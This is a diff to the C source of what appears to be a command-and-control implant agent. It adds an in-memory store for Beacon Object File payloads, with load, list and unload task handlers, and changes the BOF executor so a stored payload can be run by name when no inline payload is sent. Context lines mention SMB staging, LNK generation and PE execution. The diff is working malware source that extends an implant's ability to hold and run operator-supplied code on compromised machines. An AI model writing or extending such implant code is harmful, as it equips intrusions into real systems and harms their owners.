@@ -1097,6 +1097,66 @@ static void smb_stage_cleanup(const char *host, const char *user) {
     }
 }
 
+// ── BOF in-process store ──────────────────────────────────────────────────────
+
+#define BOF_STORE_MAX 32
+
+typedef struct {
+    char     name[128];
+    uint8_t *data;
+    size_t   len;
+} BofEntry;
+
+static BofEntry g_bof_store[BOF_STORE_MAX];
+static int g_bof_store_count = 0;
+
+static void bof_store_set(const char *name, const uint8_t *data, size_t len) {
+    for (int i = 0; i < g_bof_store_count; i++) {
+        if (strcmp(g_bof_store[i].name, name) == 0) {
+            free(g_bof_store[i].data);
+            g_bof_store[i].data = (uint8_t*)malloc(len);
+            if (g_bof_store[i].data) { memcpy(g_bof_store[i].data, data, len); g_bof_store[i].len = len; }
+            return;
+        }
+    }
+    if (g_bof_store_count >= BOF_STORE_MAX) return;
+    strncpy(g_bof_store[g_bof_store_count].name, name, 127);
+    g_bof_store[g_bof_store_count].data = (uint8_t*)malloc(len);
+    if (g_bof_store[g_bof_store_count].data) {
+        memcpy(g_bof_store[g_bof_store_count].data, data, len);
+        g_bof_store[g_bof_store_count].len = len;
+        g_bof_store_count++;
+    }
+}
+
+static uint8_t* bof_store_get(const char *name, size_t *out_len) {
+    for (int i = 0; i < g_bof_store_count; i++)
+        if (strcmp(g_bof_store[i].name, name) == 0) { *out_len = g_bof_store[i].len; return g_bof_store[i].data; }
+    return NULL;
+}
+
+static int bof_store_del(const char *name) {
+    for (int i = 0; i < g_bof_store_count; i++) {
+        if (strcmp(g_bof_store[i].name, name) == 0) {
+            free(g_bof_store[i].data);
+            g_bof_store[i] = g_bof_store[--g_bof_store_count];
+            return 1;
+        }
+    }
+    return 0;
+}
+
+static char* bof_store_list_str(void) {
+    static char buf[4096]; buf[0]='\0';
+    if (!g_bof_store_count) { strncpy(buf,"(bof store empty)",sizeof(buf)-1); return buf; }
+    for (int i = 0; i < g_bof_store_count; i++) {
+        char line[256];
+        snprintf(line,sizeof(line),"  %-30s  %zu bytes\n",g_bof_store[i].name,g_bof_store[i].len);
+        strncat(buf,line,sizeof(buf)-strlen(buf)-1);
+    }
+    return buf;
+}
+
 // ── GEN_LNK helper ────────────────────────────────────────────────────────────
 
 #ifdef _WIN32
@@ -3323,21 +3383,31 @@ void dispatch_task(AgentTask *task) {
                 coff_b64_len = (size_t)(end - p);
             }
         }
-        if (!coff_start || coff_b64_len == 0) {
-            agent_send_result(task->id, "", "BOF: missing coff_b64"); return;
-        }
-
-        char *coff_b64 = (char *)malloc(coff_b64_len + 1);
-        if (!coff_b64) { agent_send_result(task->id, "", "BOF: oom"); return; }
-        memcpy(coff_b64, coff_start, coff_b64_len);
-        coff_b64[coff_b64_len] = '\0';
-
         size_t coff_len = 0;
-        uint8_t *coff_data = b64_decode(coff_b64, &coff_len);
-        free(coff_b64);
-        if (!coff_data || coff_len == 0) {
-            free(coff_data);
-            agent_send_result(task->id, "", "BOF: coff_b64 decode failed"); return;
+        uint8_t *coff_data = NULL;
+
+        if (coff_start && coff_b64_len > 0) {
+            char *coff_b64 = (char *)malloc(coff_b64_len + 1);
+            if (!coff_b64) { agent_send_result(task->id, "", "BOF: oom"); return; }
+            memcpy(coff_b64, coff_start, coff_b64_len);
+            coff_b64[coff_b64_len] = '\0';
+            coff_data = b64_decode(coff_b64, &coff_len);
+            free(coff_b64);
+            if (!coff_data || coff_len == 0) {
+                free(coff_data);
+                agent_send_result(task->id, "", "BOF: coff_b64 decode failed"); return;
+            }
+        } else {
+            /* no inline payload — check in-process store; first token of args is the name */
+            char bof_name[128] = "";
+            sscanf(args, "%127s", bof_name);
+            uint8_t *stored = bof_name[0] ? bof_store_get(bof_name, &coff_len) : NULL;
+            if (!stored || coff_len == 0) {
+                agent_send_result(task->id, "", "BOF: missing coff_b64 and not in store"); return;
+            }
+            coff_data = (uint8_t*)malloc(coff_len);
+            if (!coff_data) { agent_send_result(task->id, "", "BOF: oom"); return; }
+            memcpy(coff_data, stored, coff_len);
         }
 
         /* Extract optional args_b64 value */
@@ -3533,10 +3603,30 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id,"","GEN_LNK: Windows only");
 #endif
     }
-    else if (strcmp(type_upper, "BOF_STORE_LOAD") == 0 ||
-             strcmp(type_upper, "BOF_STORE_LIST") == 0 ||
-             strcmp(type_upper, "BOF_STORE_UNLOAD") == 0) {
-        agent_send_result(task->id, "", "BOF_STORE: not yet implemented in C agent");
+    else if (strcmp(type_upper, "BOF_STORE_LOAD") == 0) {
+        /* task->payload contains raw COFF bytes; args = name */
+        char bname[128] = "";
+        sscanf(task->args ? task->args : "", "%127s", bname);
+        if (!bname[0]) { agent_send_result(task->id, "", "BOF_STORE_LOAD: missing name"); return; }
+        if (!task->payload || task->payload_len == 0) {
+            agent_send_result(task->id, "", "BOF_STORE_LOAD: no payload"); return;
+        }
+        bof_store_set(bname, task->payload, task->payload_len);
+        char msg[192]; snprintf(msg,sizeof(msg),"[+] BOF '%s' loaded (%zu bytes)",bname,task->payload_len);
+        agent_send_result(task->id, msg, "");
+    }
+    else if (strcmp(type_upper, "BOF_STORE_LIST") == 0) {
+        agent_send_result(task->id, bof_store_list_str(), "");
+    }
+    else if (strcmp(type_upper, "BOF_STORE_UNLOAD") == 0) {
+        char bname[128] = "";
+        sscanf(task->args ? task->args : "", "%127s", bname);
+        if (bof_store_del(bname)) {
+            char msg[192]; snprintf(msg,sizeof(msg),"[+] BOF '%s' unloaded",bname);
+            agent_send_result(task->id, msg, "");
+        } else {
+            agent_send_result(task->id, "", "BOF_STORE_UNLOAD: name not found");
+        }
     }
     /* ── Parity aliases & stubs ──────────────────────────────────────────── */
     else if (strcmp(type_upper, "PE_EXEC") == 0) {
